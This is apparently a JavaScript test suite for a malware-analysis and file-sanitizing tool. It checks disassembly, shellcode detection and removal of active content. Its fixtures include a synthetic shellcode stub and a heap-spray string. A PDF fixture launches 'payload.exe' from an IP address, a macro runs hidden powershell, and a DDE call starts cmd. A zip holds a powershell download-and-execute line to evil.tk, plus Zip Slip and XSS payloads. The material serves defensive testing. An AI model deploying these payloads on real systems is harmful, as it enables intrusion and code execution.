// Creato da anvex2012
'use strict';
/* Tests for the disassembler, the algorithms, shellcode detection and the CDR (sanitize) engine.
 * All samples are generated on the fly and are NOT functional malware: the "shellcode" below is a
 * synthetic sequence with the typical structure (GetPC, PEB walk, ROR13 hashing, hash constants,
 * stack string) but it never calls anything. */
const fs = require('fs');
const os = require('os');
const path = require('path');
const zlib = require('zlib');
const crypto = require('crypto');
const { spawnSync } = require('child_process');

process.env.GAUNTLER_HOME = fs.mkdtempSync(path.join(os.tmpdir(), 'gauntler-adv-home-'));
const { scanBuffer, scanFile } = require('../core');
const x86 = require('../core/disasm/x86');
const arm64 = require('../core/disasm/arm64');
const shellcode = require('../core/disasm/shellcode');
const apihash = require('../core/algorithms/apihash');
const xorsearch = require('../core/algorithms/xorsearch');
const ctph = require('../core/algorithms/ctph');
const { sanitizeBuffer, sanitizeFile } = require('../core/sanitize');
const { writeZip, readZip, extract } = require('../core/zip');

let fail = 0;
const check = (name, cond, extra = '') => { console.log(`${cond ? '✔' : '✘'} ${name}${cond ? '' : '  ' + extra}`); if (!cond) fail++; };
const work = fs.mkdtempSync(path.join(os.tmpdir(), 'gauntler-adv-'));

const SHELLCODE = Buffer.from('fce8000000005d31c0648b50308b520c8b52148b722831ffacc1cf0d01c784c075f681ff318b6f8768f0b5a256682e6578656863616c63c3', 'hex');
function makePE() {
  const b = Buffer.alloc(0x600);
  b.write('MZ', 0); b.writeUInt32LE(0x80, 0x3c); b.write('This program cannot be run in DOS mode.\r\r\n$', 0x4e, 'latin1'); b.write('PE\0\0', 0x80, 'latin1');
  const coff = 0x84;
  b.writeUInt16LE(0x14c, coff); b.writeUInt16LE(1, coff + 2); b.writeUInt16LE(0xe0, coff + 16); b.writeUInt16LE(0x102, coff + 18);
  const opt = coff + 20;
  b.writeUInt16LE(0x10b, opt); b.writeUInt32LE(0x1000, opt + 16); b.writeUInt32LE(0x400000, opt + 28); b.writeUInt16LE(3, opt + 68); b.writeUInt32LE(16, opt + 92);
  const sec = opt + 0xe0;
  b.write('.text', sec, 'latin1'); b.writeUInt32LE(0x200, sec + 8); b.writeUInt32LE(0x1000, sec + 12); b.writeUInt32LE(0x200, sec + 16); b.writeUInt32LE(0x400, sec + 20); b.writeUInt32LE(0x60000020, sec + 36);
  // entry: push ebp; mov ebp, esp; xor eax, eax; pop ebp; ret
  Buffer.from('5589e531c05dc3', 'hex').copy(b, 0x400);
  return b;
}
/** Minimal OLE2 compound file: Root → Macros/VBA/dir (VBA) + WordDocument */
function makeOle(vbaText) {
  const ss = 512, ENDC = 0xfffffffe, FREE = 0xffffffff;
  const dirData = Buffer.alloc(4096); Buffer.from(vbaText, 'latin1').copy(dirData);
  const docData = Buffer.alloc(4096, 0x20); Buffer.from('Documento di prova', 'latin1').copy(docData);
  const nSec = 2 + 8 + 8 + 1; // FAT, directory (2 sectors: 1 and 18), dir stream, WordDocument
  const out = Buffer.alloc(ss * (nSec + 1));
  const h = out;
  Buffer.from('d0cf11e0a1b11ae1', 'hex').copy(h, 0);
  h.writeUInt16LE(0x3e, 0x18); h.writeUInt16LE(3, 0x1a); h.writeUInt16LE(0xfffe, 0x1c); h.writeUInt16LE(9, 0x1e); h.writeUInt16LE(6, 0x20);
  h.writeUInt32LE(1, 0x2c); h.writeUInt32LE(1, 0x30); h.writeUInt32LE(4096, 0x38); h.writeUInt32LE(ENDC, 0x3c); h.writeUInt32LE(0, 0x40); h.writeUInt32LE(ENDC, 0x44); h.writeUInt32LE(0, 0x48);
  for (let i = 0; i < 109; i++) h.writeUInt32LE(i === 0 ? 0 : FREE, 0x4c + i * 4);
  const sec = (n) => ss * (n + 1);
  const fat = new Array(ss / 4).fill(FREE);
  fat[0] = 0xfffffffd; fat[1] = 18; fat[18] = ENDC;
  for (let s = 2; s < 10; s++) fat[s] = s === 9 ? ENDC : s + 1;
  for (let s = 10; s < 18; s++) fat[s] = s === 17 ? ENDC : s + 1;
  fat.forEach((v, i) => out.writeUInt32LE(v >>> 0, sec(0) + i * 4));
  const dirent = (i, name, type, { left = FREE, right = FREE, child = FREE, start = ENDC, size = 0 } = {}) => {
    const o = i < 4 ? sec(1) + i * 128 : sec(18) + (i - 4) * 128;
    const nb = Buffer.from(name + '\0', 'utf16le'); nb.copy(out, o); out.writeUInt16LE(nb.length, o + 64);
    out[o + 66] = type; out[o + 67] = 1;
    out.writeUInt32LE(left >>> 0, o + 68); out.writeUInt32LE(right >>> 0, o + 72); out.writeUInt32LE(child >>> 0, o + 76);
    out.writeUInt32LE(start >>> 0, o + 116); out.writeUInt32LE(size, o + 120);
  };
  dirent(0, 'Root Entry', 5, { child: 1 });
  dirent(1, 'Macros', 1, { child: 2, right: 3 });
  dirent(2, 'VBA', 1, { child: 4 });
  dirent(3, 'WordDocument', 2, { start: 10, size: 4096 });
  dirent(4, 'dir', 2, { start: 2, size: 4096 });
  dirData.copy(out, sec(2)); docData.copy(out, sec(10));
  return out;
}

(async () => {
  /* ---------------- disassemblers ---------------- */
  const t = (hex, bits) => x86.decode(Buffer.from(hex, 'hex'), 0, { bits, address: 0x1000 }).text;
  check('x86: xor eax, eax', t('31c0', 32) === 'xor eax, eax', t('31c0', 32));
  check('x64: mov rax, [rip+…] con destinazione', t('488b0500100000', 64) === 'mov rax, qword ptr [rip + 0x1000] ; 0x2007', t('488b0500100000', 64));
  check('x64: call relativa', t('e8fb0f0000', 64) === 'call 0x2000', t('e8fb0f0000', 64));
  check('x86: fnstenv [esp-0xc]', t('d97424f4', 32) === 'fnstenv [esp - 0xc]', t('d97424f4', 32));
  check('x64: syscall / endbr64', t('0f05', 64) === 'syscall' && t('f30f1efa', 64) === 'endbr64');
  check('x64: VEX (vpxor ymm)', /^vpxor ymm/.test(t('c5fdefc0', 64)), t('c5fdefc0', 64));
  const a = (hex) => arm64.decode(Buffer.from(hex, 'hex'), 0, { address: 0x1000 }).text;
  check('arm64: ret / stp / bl / svc', a('c0035fd6') === 'ret' && a('fd7bbfa9') === 'stp x29, x30, [sp, #-0x10]!' && a('04000094') === 'bl 0x1010' && a('011000d4') === 'svc #0x80', [a('c0035fd6'), a('fd7bbfa9'), a('04000094'), a('011000d4')].join(' | '));

  /* ---------------- algorithms ---------------- */
  check('hash API Metasploit (LoadLibraryA = 0x0726774c)', (apihash.lookup(0x0726774c) || []).some((m) => m.api === 'LoadLibraryA'));
  check('hash API ROR13 (0xec0e4e8e)', (apihash.lookup(0xec0e4e8e) || []).some((m) => m.api === 'LoadLibraryA' && m.alg === 'ror13'));
  const pe = makePE();
  const key = Buffer.from('k3y!');
  const enc = Buffer.from(pe.map((b, i) => b ^ key[i % 4]));
  const xs = xorsearch.search(Buffer.concat([crypto.randomBytes(777), enc]));
  check('XOR: chiave a 4 byte recuperata dal testo noto', xs.some((x) => x.id === 'pe-stub' && x.key.length === 4), JSON.stringify(xs.map((x) => x.keyHex)));
  const payload = xorsearch.extractPayload(Buffer.concat([crypto.randomBytes(777), enc]), xs[0]);
  check('XOR: payload decifrato è un PE', payload.subarray(0, 2).toString() === 'MZ');
  check('XOR: nessun falso positivo su 8 MB casuali', !xorsearch.search(crypto.randomBytes(8 * 1024 * 1024)).length);
  const f1 = fs.readFileSync(process.execPath).subarray(0, 300000);
  const f2 = Buffer.from(f1); for (let i = 1000; i < 1400; i++) f2[i] ^= 0x5a;
  check('CTPH: file simili ≥ 80, casuale = 0', ctph.compare(ctph.hash(f1), ctph.hash(f2)) >= 80 && ctph.compare(ctph.hash(f1), ctph.hash(crypto.randomBytes(300000))) === 0, `${ctph.compare(ctph.hash(f1), ctph.hash(f2))}`);

  /* ---------------- shellcode ---------------- */
  const found = shellcode.find(Buffer.concat([crypto.randomBytes(4000), SHELLCODE, crypto.randomBytes(4000)]));
  check('shellcode trovato nei dati (confidenza alta)', found.length === 1 && found[0].start === 4000 && found[0].confidence === 'high', JSON.stringify(found.map((f) => [f.start, f.behaviours])));
  check('shellcode: stringa sullo stack ricostruita', found[0] && found[0].stackStrings.includes('calc.exe'));
  let fp = 0; for (let k = 0; k < 4; k++) fp += shellcode.find(crypto.randomBytes(16 * 1024 * 1024)).length;
  check('shellcode: nessun falso positivo su 64 MB casuali', fp === 0, String(fp));

  /* ---------------- engine integration ---------------- */
  const r1 = await scanBuffer(Buffer.concat([crypto.randomBytes(3000), SHELLCODE, crypto.randomBytes(3000)]), 'exploit.bin');
  check('analisi: shellcode in un file di dati → Malevolo/Pericoloso', r1.overall.score <= 25 && r1.findings.some((f) => /Shellcode/.test(f.title)), `${r1.overall.score}`);
  check('analisi: listato assembly dello shellcode nel report', r1.machineCode && r1.machineCode.shellcode && r1.machineCode.shellcode[0].listing.length > 10);
  check('analisi: impronta CTPH presente', /^\d+:/.test(r1.file.hashes.ctph || ''));
  const spray = '%u' + Array.from({ length: SHELLCODE.length / 2 + (SHELLCODE.length % 2) }, (_, i) => ((SHELLCODE[i * 2 + 1] || 0x90) << 8 | SHELLCODE[i * 2]).toString(16).padStart(4, '0')).join('%u');
  const r2 = await scanBuffer(Buffer.from(`<html><script>var sc = unescape("${spray}"); var nop = unescape("%u9090%u9090"); while (nop.length < 0x10000) nop += nop;</script></html>`), 'spray.html');
  check('analisi: shellcode %u in JavaScript decodificato e riconosciuto', r2.findings.some((f) => /shellcode/i.test(f.title + f.detail + (f.evidence || []).join(' '))) && r2.overall.score <= 39, `${r2.overall.score}`);
  const r3 = await scanBuffer(Buffer.concat([crypto.randomBytes(2048), enc, crypto.randomBytes(512)]), 'dati.dat');
  check('analisi: eseguibile nascosto con XOR → decifrato e analizzato', r3.findings.some((f) => /Eseguibile nascosto cifrato/.test(f.title)) && r3.children.some((c) => c.file.type.id === 'pe'), r3.findings.map((f) => f.title).join(' | '));
  const tab = Buffer.alloc(64); [0x0726774c, 0xe553a458, 0x876f8b31].forEach((v, i) => tab.writeUInt32LE(v, i * 8));
  const r4 = await scanBuffer(Buffer.concat([crypto.randomBytes(1000), tab, crypto.randomBytes(1000)]), 'config.bin');
  check('analisi: tabella di hash di API', r4.findings.some((f) => /hash di API/.test(f.title)));
  const r5 = await scanBuffer(makePE(), 'tool.exe');
  check('analisi: PE disassemblato dal punto di avvio', r5.machineCode && r5.machineCode.stats && r5.machineCode.stats.instructions >= 5, JSON.stringify(r5.machineCode && r5.machineCode.stats));
  for (const bin of ['/bin/ls', '/usr/bin/true', '/bin/cat']) {
    if (!fs.existsSync(bin)) continue;
    const r = await scanFile(bin, { cache: false });
    const mc = r.categories.find((c) => c.id === 'machinecode');
    check(`programma di sistema legittimo (${bin}): codice macchina ≥ 90`, mc && mc.score >= 90, mc && mc.findings.map((f) => f.title).join(' | '));
    break;
  }

  /* ---------------- CDR / sanitize ---------------- */
  const js = zlib.deflateSync(Buffer.from('app.launchURL("http://45.12.33.9/payload.exe"); eval(unescape("%u9090"));'));
  const pdf = Buffer.concat([Buffer.from(`%PDF-1.7\n1 0 obj << /Type /Catalog /Pages 4 0 R /OpenAction 2 0 R /Names << /EmbeddedFiles << /Names [(x.exe) 6 0 R] >> >> >> endobj\n2 0 obj << /S /JavaScript /JS 3 0 R >> endobj\n3 0 obj << /Length ${js.length} /Filter /FlateDecode >>\nstream\n`, 'latin1'), js, Buffer.from('\nendstream\nendobj\n4 0 obj << /Type /Pages /Kids [5 0 R] /Count 1 >> endobj\n5 0 obj << /Type /Page /Parent 4 0 R /MediaBox [0 0 612 792] /AA << /O << /S /Launch /F (cmd.exe) >> >> >> endobj\n6 0 obj << /Type /Filespec /F (x.exe) /EF << /F 7 0 R >> >> endobj\n7 0 obj << /Type /EmbeddedFile /Length 2 >>\nstream\nMZ\nendstream\nendobj\ntrailer << /Root 1 0 R >>\n%%EOF\nPAYLOAD-NASCOSTO-DOPO-EOF', 'latin1')]);
  const s1 = await sanitizeBuffer(pdf, 'fattura.pdf');
  const s1t = s1.output ? s1.output.toString('latin1') : '';
  check('CDR PDF: JavaScript, OpenAction, Launch, allegati rimossi', s1.status === 'sanitized' && !/\/JavaScript|\/OpenAction|\/Launch|\/EmbeddedFile|\/AA|PAYLOAD-NASCOSTO/.test(s1t) && s1.after.score >= 90, s1t.slice(0, 400));
  check('CDR PDF: struttura valida (xref ricostruita)', /xref\n0 8\n/.test(s1t) && /startxref\n\d+\n%%EOF\n$/.test(s1t));
  const vba = 'Attribute VB_Name = "Modulo1"\nSub AutoOpen()\nShell "powershell -w hidden -enc ZQBjAGgAbwA="\nEnd Sub\n';
  const docm = writeZip([
    { name: '[Content_Types].xml', data: '<Types><Override PartName="/word/document.xml" ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/><Override PartName="/word/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/></Types>' },
    { name: 'word/_rels/document.xml.rels', data: '<Relationships><Relationship Id="r1" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/><Relationship Id="r2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://evil.example/t.dotm" TargetMode="External"/><Relationship Id="r3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.example.com/" TargetMode="External"/></Relationships>' },
    { name: 'word/document.xml', data: '<w:document><w:body><w:p><w:r><w:t>Fattura</w:t></w:r><w:r><w:instrText>DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc"</w:instrText></w:r></w:p></w:body></w:document>' },
    { name: 'word/vbaProject.bin', data: Buffer.concat([Buffer.from([1, 0, 0, 0]), Buffer.from(vba)]) },
  ]);
  const s2 = await sanitizeBuffer(docm, 'fattura.docm');
  const parts = s2.output ? readZip(s2.output).entries.map((e) => e.name) : [];
  const rels = s2.output ? extract(s2.output, readZip(s2.output).entries.find((e) => /document\.xml\.rels/.test(e.name))).data.toString() : '';
  check('CDR Office: macro, template remoto e DDE rimossi, .docm → .docx', s2.status === 'sanitized' && s2.outName === 'fattura.safe.docx' && !parts.includes('word/vbaProject.bin') && !/attachedTemplate|vbaProject/.test(rels) && /www\.example\.com/.test(rels), JSON.stringify([s2.status, s2.outName, parts, rels]));
  const s3 = await sanitizeBuffer(makeOle(vba), 'vecchio.doc');
  check('CDR .doc (OLE): progetto VBA azzerato, documento mantenuto', s3.status === 'sanitized' && s3.output.indexOf('AutoOpen') < 0 && s3.output.indexOf('Documento di prova') > 0 && s3.actions.some((x) => /VBA/.test(x)), JSON.stringify(s3.actions) + s3.reason);
  const html = Buffer.from('<html><body><p>Ciao</p><img src=x onerror="alert(1)"><a href="jav&#x61;script:alert(2)">x</a><scr<script>x</script>ipt>alert(3)</script><svg><foreignObject><iframe src="http://e"></iframe></foreignObject></svg><form action="https://collect.evil.xyz/p"><input type=password></form></body></html>');
  const s4 = await sanitizeBuffer(html, 'pagina.html');
  const s4t = s4.output.toString();
  check('CDR HTML: script, eventi, javascript:, iframe, form action rimossi', !/<script|onerror|javascript:|<iframe|foreignObject|action=/i.test(s4t) && /Ciao/.test(s4t), s4t);
  const jpg = Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe1, 0, 16]), Buffer.from('Exif\0\0GPSDATA!'), Buffer.from([0xff, 0xdb, 0, 4, 1, 2, 0xff, 0xda, 0, 4, 1, 2, 9, 9, 9, 0xff, 0xd9]), makePE()]);
  const s5 = await sanitizeBuffer(jpg, 'foto.jpg');
  check('CDR immagine: EXIF/GPS e PE accodato rimossi', s5.status === 'sanitized' && s5.output.indexOf('Exif') < 0 && s5.output.indexOf('MZ') < 0 && s5.output[s5.output.length - 1] === 0xd9);
  const rtf = Buffer.from('{\\rtf1\\ansi Testo{\\object\\objemb{\\*\\objclass Equation.3}{\\*\\objdata 01050000' + '4d5a90'.repeat(30) + '}}\\par}');
  const s6 = await sanitizeBuffer(rtf, 'doc.rtf');
  check('CDR RTF: oggetto incorporato rimosso', s6.status === 'sanitized' && !/objdata|Equation/.test(s6.output.toString()) && /Testo/.test(s6.output.toString()));
  const s7 = await sanitizeBuffer(Buffer.from('nome,valore\nA,=HYPERLINK("http://e")\nB,-3.5\n'), 'dati.csv');
  check('CDR CSV: formula neutralizzata, numeri negativi intatti', /'=HYPERLINK/.test(s7.output.toString()) && /B,-3\.5/.test(s7.output.toString()));
  const s8 = await sanitizeBuffer(Buffer.from('if (a \u202E\u2066 b) {}\n'), 'auth.js');
  check('CDR: script con Trojan Source → bloccato (codice non disarmabile)', s8.status === 'blocked');
  const s9 = await sanitizeBuffer(Buffer.from('nota\u200b con \u202Ecaratteri nascosti\n'), 'nota.txt');
  check('CDR testo: caratteri invisibili e bidirezionali rimossi', s9.status === 'sanitized' && !/[\u200b\u202e]/.test(s9.output.toString('utf8')));
  const zip = writeZip([{ name: 'leggimi.txt', data: 'ciao' }, { name: '../../../etc/evil.txt', data: 'x' }, { name: 'setup.js', data: 'var s=new ActiveXObject("WScript.Shell");s.Run("powershell -w hidden IEX (New-Object Net.WebClient).DownloadString(\'http://evil.tk/p\')");' }, { name: 'fattura.pdf', data: pdf }]);
  const s10 = await sanitizeBuffer(zip, 'pacco.zip');
  const zn = s10.output ? readZip(s10.output).entries.map((e) => e.name) : [];
  check('CDR archivio: script rimosso, PDF disarmato, Zip Slip neutralizzato', s10.status === 'sanitized' && zn.includes('leggimi.txt') && zn.includes('etc/evil.txt') && !zn.some((n) => /setup\.js|\.\./.test(n)) && zn.includes('fattura.safe.pdf'), JSON.stringify(zn));
  const s11 = await sanitizeBuffer(Buffer.concat([crypto.randomBytes(500), SHELLCODE, crypto.randomBytes(500)]), 'exploit.bin');
  check('CDR: dati con shellcode → bloccati dalla verifica', s11.status === 'blocked', s11.status);
  const s12 = await sanitizeBuffer(makePE(), 'tool.exe', { strict: true });
  check('CDR: programma in modalità rigorosa → bloccato', s12.status === 'blocked');
  fs.writeFileSync(path.join(work, 'f.pdf'), pdf);
  const s13 = await sanitizeFile(path.join(work, 'f.pdf'));
  const st = fs.statSync(s13.outPath);
  check('CDR file: scritto accanto all\'originale, senza permesso di esecuzione', s13.outPath.endsWith('f.safe.pdf') && !(st.mode & 0o111) && fs.existsSync(path.join(work, 'f.pdf')));

  /* ---------------- CLI ---------------- */
  const CLI = path.join(__dirname, '..', 'cli', 'gauntler.js');
  const env = { ...process.env, NO_COLOR: '1' };
  const run = (args) => spawnSync(process.execPath, [CLI, ...args], { env, encoding: 'utf8', cwd: work, timeout: 120000 });
  fs.writeFileSync(path.join(work, 'sc.bin'), Buffer.concat([crypto.randomBytes(100), SHELLCODE, crypto.randomBytes(100)]));
  let r = run(['disasm', 'sc.bin']);
  check('CLI disasm: shellcode trovato e disassemblato', r.status === 0 && /ror edi, 0xd/.test(r.stdout) && /fs:\[eax \+ 0x30\]/.test(r.stdout), r.stdout + r.stderr);
  r = run(['disasm', 'sc.bin', '--raw', '--arch', 'x86', '--offset', '100', '--length', '8', '-b']);
  check('CLI disasm --raw -b: byte in binario', r.status === 0 && /11111100\s+cld/.test(r.stdout), r.stdout);
  r = run(['disasm', 'sc.bin', '--dump', '--length', '8']);
  check('CLI disasm --dump: codice binario', /^00000000  [01]{8}( [01]{8}){7}/.test(r.stdout), r.stdout);
  if (fs.existsSync('/bin/ls')) {
    r = run(['disasm', '/bin/ls', '-F', '--json']);
    let j; try { j = JSON.parse(r.stdout); } catch { j = null; }
    check('CLI disasm -F: funzioni con complessità', j && j.length > 3 && j[0].cyclomatic >= 1, r.stderr);
  }
  fs.writeFileSync(path.join(work, 'doc.docm'), docm);
  r = run(['sanitize', 'doc.docm']);
  check('CLI sanitize: copia sicura creata (exit 0)', r.status === 0 && fs.existsSync(path.join(work, 'doc.safe.docx')), r.stdout + r.stderr);
  fs.writeFileSync(path.join(work, 'tool.exe'), makePE());
  r = run(['sanitize', 'tool.exe', '--strict']);
  check('CLI sanitize: programma bloccato (exit 1)', r.status === 1 && /bloccato/.test(r.stdout), r.stdout + r.stderr);
  r = run(['sanitize', 'doc.docm', '--in-place']);
  check('CLI sanitize --in-place: originale in quarantena', r.status === 0 && !fs.existsSync(path.join(work, 'doc.docm')) && fs.existsSync(path.join(work, 'doc.docx')) && /quarantena/.test(r.stdout), r.stdout + r.stderr);

  fs.rmSync(work, { recursive: true, force: true });
  fs.rmSync(process.env.GAUNTLER_HOME, { recursive: true, force: true });
  console.log(fail ? `\n${fail} test avanzati falliti` : '\nTutti i test avanzati superati');
  process.exit(fail ? 1 : 0);
})().catch((e) => { console.error(e); process.exit(1); });
